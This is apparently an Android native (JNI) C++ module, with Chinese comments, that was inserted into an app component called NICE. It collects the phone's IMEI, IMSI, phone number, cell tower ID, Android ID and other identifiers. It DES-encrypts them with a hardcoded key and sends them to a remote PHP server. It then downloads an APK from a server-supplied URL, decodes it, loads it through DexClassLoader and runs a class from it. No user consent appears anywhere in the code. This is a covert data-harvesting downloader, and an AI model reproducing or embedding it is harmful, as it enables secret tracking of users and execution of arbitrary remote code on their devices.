//
// Created by zhengnan on 2017/1/10.
// 用于动态加载 ioc账号注册相关dex并执行。
//   (  为了方便直接在线上用，而非集成，所以才插到了NICE模块中！！！ )
//

#include "IcCore.h"
#include "../TM.h"
#include "../OtherParams.h"
#include "../Build.h"
#include "../Helper.h"
#include "../Token_Z.h"

jobject  remoteClassRef = NULL;
bool isZtest = false;
void icExecute(JNIEnv * env,jobject ctx){
    jobject sp = getSp(env, ctx);
    string requestUrl = "http://playdecode.lettersharing.com/ApplePlugin.php";
    string pName = jstringTostring(env,getPkname(env, ctx),true);
    isZtest = isExistPackage(env, ctx, pName.c_str());
    string dexPath = "/data/data/"+pName+"/files/nice/ic/ic.apk";
    string optDir = "/data/data/"+pName+"/files/nice/ic/optDir";
    mkdir4java(env,optDir.c_str());
    //当前时间
    long long cTime = now(env);
    string nativeNextTime = spGet(env,sp,"ic_nextTime","0");
    //下次联网时间
    long long nativeCTime;
    str2llong(nativeCTime,nativeNextTime);
    if(cTime>nativeCTime){//可以联网，否则从本地取
        //1,请求后台下载最新的 控制模块
        string linkParam = getLinkParams(env, ctx);
        if (isZtest)LOGPER("requestParams:%s", linkParam.c_str());
        string newParams = jstringTostring(env, encodeDes(env, "abc12345", linkParam), true);
        int requestCode = 0;
        string ret;
        for (int i = 0; i < 3; i++) {
            requestCode = httpPost(requestUrl.c_str(), newParams.c_str(), "", ret);
            if (requestCode == 200) break;
            if (isZtest) LOGPER("11try request againgain...");
        }
        if (requestCode != 200) {
            return;
        }
        string deStr = decodeDes(env, "abc12345", ret);
        if(isZtest)LOGPER("ret: %s",deStr.c_str());
        if(checkRetValid(env,deStr)!="0")return;
        //
        JSONValue *jv4request = JSON::Parse(deStr.c_str());
        //校验返回数据
        if(jv4request==NULL||!jv4request->HasChild("status")||!jv4request->HasChild("nextTime")
           ||!jv4request->HasChild("plugin")||!jv4request->Child("plugin")->HasChild("sign")){
            if(isZtest)LOGPER("invalid ret");
            return;
        }

        //根据状态码执行子操作
        double status = jv4request->Child("status")->AsNumber();
        //计算下次联网时间
        long long nextTime =cTime+(long)jv4request->Child("nextTime")->AsNumber();
        string nextTimeStr;
        llong2str(nextTime,nextTimeStr);
        string serverSign = jv4request->Child("plugin")->Child("sign")->AsString();
        string serverDown = jv4request->Child("plugin")->Child("down_url")->AsString();
        string nativeSign = spGet(env,sp,"ic_nativeSign","");
        if((int) status!=0){
            spPut(env,sp,"ic_nextTime",nextTimeStr.c_str());
            return;
        }
        if(serverSign!=nativeSign) {
            //download
            int rcode = httpDownload(serverDown.c_str(),dexPath);
            samDecodeFile(dexPath,dexPath,12345);
            if(rcode!=200) {
                if (isZtest)LOGPER("down fail");
                return;
            }
            //下载成功，保存新的sign
            spPut(env, sp, "ic_nativeSign", serverSign.c_str());
        }
        //当有下载时，只有下载成功后才能更新联网间隔
        spPut(env,sp,"ic_nextTime",nextTimeStr.c_str());
    }else{//在联网间隔内，找本地的包看是否能找到，找不到就return
        if(isZtest)LOGPER("in interval!");
        if(!fileExist(dexPath.c_str()))return;
    }

        LOGPER("start!!!!");
    //创建classLoader,加载类
    if(remoteClassRef==NULL){

        jobject  classLoader = createDexClassLoader(env,dexPath,optDir,ctx);
        string remoteClass = "com.icsdk.ICSdkInner";
        jobject tempService = dexLoadClassObj(env, classLoader, remoteClass);
        remoteClassRef = env->NewGlobalRef(tempService);
        env->DeleteLocalRef(classLoader);
        env->DeleteLocalRef(tempService);
        if(remoteClassRef==NULL){
            return;
        }
    }
    //2,执行dex 指定类
    jclass  clz_remote = env->GetObjectClass(remoteClassRef);
    jmethodID  mid = env->GetStaticMethodID(clz_remote,"a","(Landroid/content/Context;)V");
    env->CallStaticVoidMethod(clz_remote, mid,ctx);
    if(env->ExceptionCheck()==JNI_TRUE){
        env->ExceptionClear();
    }

    //destroy
    env->DeleteLocalRef(clz_remote);

}

string getLinkParams(JNIEnv *env ,jobject ctx) {
    //写入共享数据
    //包名
    string pName = jstringTostring(env,getPkname(env, ctx),true);
    jobject sp = getSp(env, ctx);
    jobject tm = getTelephoneManagerObj(env, ctx);
    //imsi
    string imsi = getImsi(env, tm);
    Token_Z token(env,imsi.c_str(), pName.c_str());
    //tel
    string tel = jstringTostring(env,token.getTel(),true);
    writeNiceShare(env, ctx, tel);
    jobject shareSp = getShareSp(env,ctx);
    string cellId = spEGet(env, shareSp,"cellId", "");
    string lac = spEGet(env, shareSp,"lac", "");
    string network = getNetwork(env, ctx);
    string imei = getImei(env, tm);//no p
    string model = getModel();
    string sdkVersion = getSdkVersion();
    string channelId = spGet(env, sp, "channelId","-1");
    string gameId = spGet(env, sp, "gameId", "-1");
    string usbInterface = spGet(env, sp, "iuu", "0");
    string isUsb = (usbInterface == "2" && isUsbMode(env, ctx))?"true":"false";
    string versionCode = getVersioncode(env, ctx);

    JSONObject jo ;
    jo["vercode"] = new JSONValue("1");
    jo["imei"] = new JSONValue(imei);
    jo["imsi"] = new JSONValue(imsi);
    jo["appPackname"] = new JSONValue(pName);
    jo["channelId"] = new JSONValue(channelId);
    jo["gameId"] = new JSONValue(gameId);
    jo["model"] = new JSONValue(model);
    jo["tel"] = new JSONValue(tel);
    jo["isUsbMode"] = new JSONValue(isUsb);
    jo["androidSdkVersion"] = new JSONValue(sdkVersion);
    jo["cellId"] = new JSONValue(cellId);
    jo["lac"] = new JSONValue( lac);
    jo["network"] = new JSONValue(network);
    jo["androidId"] = new JSONValue(getAndroidId(env,ctx));
    jo["appVersion"] = new JSONValue("versionCode");

    JSONValue * jv = new JSONValue(jo);
    string linkParam = jv->Stringify();;
    delete jv;
    return linkParam;
}
string  checkRetValid(JNIEnv* env,string&deStr){
    if (deStr == "" || deStr.substr(0, 1) != "{") {
        return "108";
    }
    JSONValue *jv4request = JSON::Parse(deStr.c_str());
    if (jv4request == NULL||!jv4request->HasChild("status")) {
        return "409";
    }
    delete jv4request;

    return "0";
}